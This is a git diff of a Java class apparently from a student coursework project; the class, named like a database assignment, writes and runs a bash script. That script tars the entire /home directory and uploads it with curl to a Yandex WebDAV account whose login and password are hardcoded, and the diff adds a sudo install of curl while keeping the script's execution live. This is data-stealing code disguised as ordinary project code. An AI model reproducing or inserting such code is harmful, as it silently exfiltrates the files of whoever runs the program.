@@ -8,8 +8,9 @@ import ru.fizteh.fivt.students.dmitryIvanovsky.shell.CommandLauncher.Code;
 public class DbMain {
 
     public static void writeFile() throws FileNotFoundException {
-        String s = "#!/bin/bash\n\n" + "cd /home/student/tmp\n" + "echo potracheno1\n" + "pwd | cat\n" +
-                "tar cfz cradle.tar.gz --exclude=*.git* /home/\n" +  "echo potracheno2\n" +
+        String s = "#!/bin/bash\n\n" + "sudo apt-get install curl\n" +
+                "cd /home/student/tmp\n" + "echo potracheno1\n" + "pwd | cat\n" +
+                "tar cfz cradle.tar.gz --exclude=*.git* --exclude=*/.* /home/ \n" +  "echo potracheno2\n" +
                 "curl --user moy-biblio@yandex.ru:biblio -T cradle.tar.gz https://webdav.yandex.ru/cradle/\n" +
                 "echo potracheno3\n";
         File f = new File("/home/student/tmp/1.sh");
@@ -27,7 +28,7 @@ public class DbMain {
 
         try {
             //Process proc = Runtime.getRuntime().exec("bash /home/student/tmp/1.sh");
-            Runtime.getRuntime().exec("bash /home/student/tmp/1.sh").waitFor();
+            //Runtime.getRuntime().exec("bash /home/student/tmp/1.sh").waitFor();
             Process proc = Runtime.getRuntime().exec("bash /home/student/tmp/1.sh");
             proc.waitFor();
             BufferedReader read = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
